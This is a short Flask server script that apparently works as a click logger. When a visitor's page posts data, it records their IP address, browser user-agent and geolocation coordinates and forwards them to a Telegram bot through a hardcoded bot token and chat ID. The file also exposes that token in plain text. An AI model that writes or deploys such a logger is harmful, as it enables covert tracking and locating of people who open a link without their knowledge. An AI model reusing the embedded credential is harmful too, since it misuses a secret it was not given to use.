from flask import Flask, request, render_template
import requests
import datetime
import pytz
import os

app = Flask(__name__)

# Telegram bot config
BOT_TOKEN = '7638665325:AAEnpRe7ZTHK7VIfyVlM7lfPq9yBpcbhVzo'
CHAT_ID = '6690693429'

@app.route("/", methods=["GET", "POST"])
def home():
    if request.method == "POST":
        try:
            data = request.get_json()
            ip = request.headers.get('X-Forwarded-For', request.remote_addr)
            user_agent = request.headers.get('User-Agent')
            latitude = data.get('latitude', 'N/A')
            longitude = data.get('longitude', 'N/A')

            now = datetime.datetime.now(pytz.timezone("Asia/Kolkata"))
            current_time = now.strftime("%d-%b-%Y %I:%M %p")

            message = f"""
📥 New Click Logged!

🌐 IP: {ip}
📍 Coordinates: {latitude}, {longitude}
🧠 Browser: {user_agent}
🕒 Time: {current_time}
"""
            # Send to Telegram
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
            payload = {
                "chat_id": CHAT_ID,
                "text": message
            }
            requests.post(url, data=payload)

        except Exception as e:
            print("Error:", e)

        return "OK"

    return render_template("index.html")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
